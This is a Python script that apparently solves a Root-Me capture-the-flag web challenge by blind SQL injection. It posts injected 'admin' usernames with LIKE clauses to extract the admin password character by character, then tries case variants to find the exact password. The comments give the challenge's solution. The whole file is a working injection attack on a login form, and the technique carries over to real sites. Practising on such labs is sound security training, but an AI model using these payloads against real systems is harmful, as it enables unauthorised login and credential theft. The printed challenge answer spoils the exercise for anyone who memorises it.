import requests
import string,re,time

vocabulaire=string.printable
password=''

while(True):
    for ele in vocabulaire:
        url="http://challenge01.root-me.org/web-serveur/ch10/"

        d=requests.post(url,data={'username':"admin' and password LIKE '"+password+ele+"%'--",'password':'ada'})

        if d.text.find('Welcome back admin !</h2><h3>Your informations :</h3><p>- username : admin</p><br />Hi master ! <b>To validate the challeng')!=-1:
            password+=ele
            print('good',ele)
            break
        else:
            print('waiting ....',password+ele)
# the password is : e2azo93i but not to submit
d=list('e2azo93i')
m=[]
for i0 in ['e','E']:
    for i1 in ['a', 'A']:
        for i2 in ['z', 'Z']:
            for i3 in ['o', 'O']:
                for i4 in ['i', 'I']:
                    d=i0+'2'+i1+i2+i3+'93'+i4
                    m.append(d)
#m=['e2azo93i', 'e2azo93I', 'e2azO93i', 'e2azO93I', 'e2aZo93i', 'e2aZo93I', 'e2aZO93i', 'e2aZO93I', 'e2Azo93i', 'e2Azo93I', 'e2AzO93i', 'e2AzO93I', 'e2AZo93i', 'e2AZo93I', 'e2AZO93i', 'e2AZO93I', 'E2azo93i', 'E2azo93I', 'E2azO93i', 'E2azO93I', 'E2aZo93i', 'E2aZo93I', 'E2aZO93i', 'E2aZO93I', 'E2Azo93i', 'E2Azo93I', 'E2AzO93i', 'E2AzO93I', 'E2AZo93i', 'E2AZo93I', 'E2AZO93i', 'E2AZO93I']
# to get the exact password
for ele in m:
    url="http://challenge01.root-me.org/web-serveur/ch10/"
    ad="admin' and password='"+ele+"' --"
    d=requests.post(url,data={'username':ad,'password':'ada'})

    if d.text.find('Welcome back admin !</h2><h3>Your informations :</h3><p>- username : admin</p><br />Hi master ! <b>To validate the challeng')!=-1:
        print('good',ele)
        break
    else:
        print('waiting ....',ele)

# the password to submit is: e2azO93I



